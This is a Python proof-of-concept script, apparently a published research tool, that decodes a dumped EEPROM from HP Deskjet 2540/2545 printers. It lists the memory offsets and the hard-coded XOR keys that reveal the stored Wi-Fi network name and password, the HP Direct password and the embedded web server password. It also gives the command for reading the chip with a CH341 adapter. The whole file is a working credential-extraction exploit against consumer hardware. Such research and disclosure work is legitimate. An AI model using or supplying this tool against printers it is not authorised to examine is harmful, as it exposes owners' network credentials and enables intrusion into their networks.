#!/usr/bin/env python3
# coding: utf-8
# HP Deskjet Password Recovery - A project to extract sensitive information
# from EEPROMs of HP Deskjet 2540 and 2545 (at least) printers.
# Copyright (C) 2025  Ysard
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""Proof of concept for sensitive data recovery from the EEPROM
of HP Deskjet 2540/2545 printers.

Use the following project to read the EEPROM with a CH341 USB adapter:
    https://github.com/command-tab/ch341eeprom

    Command:
        $ ./ch341eeprom -v -s 24c128 -r my_eeprom_dump.bin

Usage:

    $ python hp_deskjet_password_recovery.py my_eeprom_dump.bin
"""

import sys
from pathlib import Path
from binascii import hexlify, unhexlify

# Start pos, end pos, key
# End pos is set empirically or following the max allowed size in the norm
DATA = {
    "SERIAL_NB": (0x1F, 0x2D, None),
    "NETWORK_NAME": (0x03AB, 0x03F2, None),
    "EWS_PASS": (0xDFA, 0xDFA + 64, None),
    "AP_ESSID": (
        0x121A,
        0x121A + 32,
        unhexlify("78ea7e79ee73e372b81302e04c316707803cc0e56f14491aefa1e04768a8706d"),
    ),
    "AP_PASSWORD": (
        0x125F,
        0x125F + 63,
        unhexlify(
            "7b2e093688580496725e21593b0d38223efa984b95346384f7925dc9a9ecffc"
            "d943854a1deecadab26b9588ccb16ba18cc92b9c66409a55f5afe13682abc97"
        ),
    ),
    "HP_DIRECT_ESSID": (
        0x1317,
        0x1317 + 20,
        unhexlify("ea99520334280fc19581e69a3ec01b729853e74c"),
    ),
    "HP_DIRECT_PASS": (
        0x1337,
        0x1337 + 63,
        unhexlify(
            "8a34b8f470c2979f7dcee0595a11b116d7e14044c2d1f6e2c07c8346af586f6"
            "06059b071043bc21f1c258bc7c6f1ff33d998362e893f06a5bef3d12198dea7"
        ),
    ),
}


def extractor(f_d, debug=False):
    """Extract and show the fields from the dump

    :param f_d: File descriptor on the opened file.
    :key debug: Enable debugging (show raw bytes).
    :type f_d: io.TextIOWrapper
    :type debug: bool
    """
    for name, (start_pos, end_pos, key) in DATA.items():

        f_d.seek(start_pos)
        cipher = f_d.read(end_pos - start_pos)

        if debug:
            print(f"RAW {name} (hex):", hexlify(cipher))
            print(f"RAW {name} (raw):", cipher)

        if key is None:
            print(f"{name}:", cipher.decode("utf8"))
            continue

        # Deciphering
        clear_text = [chr(cipher[idx] ^ k) for idx, k in enumerate(key)]
        # print(clear_text)

        if name == "AP_ESSID":
            # Extract length from the 1st byte & prune the clear text
            text_length = cipher[0] ^ key[0]
            clear_text = clear_text[1 : text_length + 1]

            if debug:
                print("AP_ESSID expected length:", text_length)

        if name == "HP_DIRECT_ESSID":
            # Add ESSID fixed prefix
            clear_text = ["HP-Print-CD-"] + clear_text

        clear_text = "".join(clear_text)
        print(f"{name}: {clear_text}")


def main(filepath, debug=False):
    """Process the given file

    :param filepath: Filepath of the eeprom dump.
    :key debug: Enable debugging (show raw bytes).
    :type filepath: pathlib.Path
    :type debug: bool
    """
    print("File:", filepath)

    with open(filepath, "rb") as f_d:
        extractor(f_d, debug=debug)


if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Forgot the file to open?")
        raise SystemExit

    filepath = Path(sys.argv[1])
    if not filepath.exists():
        print("Failed to open the file!")
        raise SystemExit

    main(filepath, debug=False)
